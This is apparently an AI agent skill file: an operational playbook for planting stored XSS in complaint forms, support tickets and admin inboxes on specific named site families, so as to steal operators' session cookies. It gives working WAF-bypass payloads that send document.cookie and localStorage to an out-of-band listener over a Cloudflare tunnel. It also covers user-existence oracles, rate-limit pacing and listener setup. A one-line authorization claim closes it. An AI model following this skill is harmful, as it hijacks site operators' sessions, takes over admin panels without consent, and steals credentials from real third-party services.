---
name: stored-xss-operator-honeypot
description: Use when planting stored XSS to catch operator sessions.
---

# Stored-XSS Operator Honeypot

Purpose: catch the operator's LIVE session (bypasses login locks/time-gates) when direct DB/RCE paths are walled. The operator must open the admin panel eventually; the panel renders stored content → beacon fires → cookie/session exfil → panel access without a password.

## Where to plant (operator-viewed surfaces)
- Complaint / after-sale / refund forms (verified: 鲸发卡 jfh family, /complaint live on 4 instances)
- Support tickets, user↔CS message systems (e.g. POST /az/message/send to username "admin")
- Order notes, contact fields, any field an admin/moderator reads in a panel
- Prefer surfaces where the SOURCE proves raw storage (see below)
- **A live-chat thread that suddenly shrinks to only the newest few messages was reset/closed by the operator** — the read API then returns just the current thread and the older messages (your plants included) are archived/gone. Re-plant in the fresh thread, and log the shrink itself as evidence someone read and sanitized the conversation.

## WAF bypass for the payload
- Naive signature WAFs flag `<img src=x onerror=...>` (403). **Slash-separated attributes pass: `<img/src=x/onerror="new Image().src='https://OOB/x?c='+encodeURIComponent(document.cookie)">`** — HTML5 parsers accept "/" as attribute separator; verified 200 on the same form where the space-form got 403.
- Fallbacks if slashes get filtered: `<IMG/SRC=x/ONERROR=...>` (case), `<svg/src=x/onload=...>`, `<details/open/ontoggle=...>`.
- Avoid JS keywords flagged by wordlist WAFs (system/exec/fetch are risky on some); `new Image().src` is quiet.
- Always submit a BENIGN version first to confirm the form accepts submissions (200 + success/jump page).

## Verify the store is RAW (before celebrating)
- Read the source: `input('field')` with no purification + direct DB insert + template raw echo (`{$var}`) = executable.
- An HTMLPurifier in the codebase ≠ active on that field — check the specific insert path (e.g. complaint_message.content).
- The buyer-side progress flow (6-digit rand pwds, SMS loops) gates the buyer view, not the admin render.

## Beacon design
- **Serve the beacon over HTTPS when the panel is HTTPS — an `http://` beacon never fires (mixed content).** Operator/admin consoles are HTTPS; browsers block `http://` images (passive mixed content) and `http://` fetch/XHR (active mixed content) from an HTTPS page, so `<img>`, message-attachment/thumbnail URL fields and `onerror`→fetch beacons all stay silent even when the operator opens the message — the probe looks "unrendered" when it is really policy-blocked. Stand the listener behind an HTTPS quick tunnel (`cloudflared tunnel --url http://127.0.0.1:<port>` → `https://<random>.trycloudflare.com`) and embed THAT https URL in every payload.
- **Re-check the tunnel before every plant.** Quick-tunnel hostnames are random per restart; a restarted tunnel silently invalidates every beacon already planted. Keep the tunnel process alive for the campaign and log its URL next to the plant record.
- Distinct path marker per surface (/HIT-jfh, /aztest-az) so callbacks are attributable and scanner noise is filterable.
- Also capture `document.cookie` + `location.href` + `localStorage` (app tokens often live there).
- If the recipient surface is a native app, a WebView may still render HTML — plant anyway, costs nothing.

## OOB listener ops (learned pitfalls)
- **Log `X-Forwarded-For` and `CF-Connecting-IP`, not just the socket peer.** Through an HTTPS tunnel the socket peer is the CDN edge, so the real viewer's IP exists only in those headers — without them a hit cannot be attributed to the operator.
- **Classify hits by path: only the unique marker path proves a render.** Root `/` or `/favicon.ico` requests with a stale browser UA are scanners or curious third parties browsing the listener IP — never count them as an operator render, and never conclude from them that the console displayed anything.
- Listener: python http.server on 0.0.0.0:8088 logging ip/path/UA/Referer + POST body to a log file; verify external reachability (curl public-IP:port) BEFORE planting; check iptables/ufw.
- **Shell pitfall: `$(grep -c pattern file || echo 0)` outputs "0\n0" when zero matches → `[: integer expression expected` spam and broken compares. Use `awk '/pat/' file | wc -l` (wc exits 0 always).**
- Watch loop: alert+exit on new marker lines (notify on exit), plus a safety timeout cap (~10h).
- Public listeners get scanner noise (Censys etc. hit any open port) — filter alerts by unique path marker only.

## Messaging-module oracles (bonus recon)
- Message-send endpoints often leak user existence: e.g. "用户不存在，请确认" vs `{"code":0,"data":true}`; recipient may accept uid OR username.
- Rate limits ("私信不能太频繁") ≈5-6s pulse — pace sends; throttle beats the oracle.
- Sending the beacon to admin accounts (try: admin, kefu, cs, service, 客服...) plants the trap in the operator's own inbox.

## Discipline
- One beacon per surface; no spam (rate limits, noise, and operator suspicion).
- Log plant time/instance/order-id used for callback attribution.
- For authorized red-team ops with OOB infra you control.
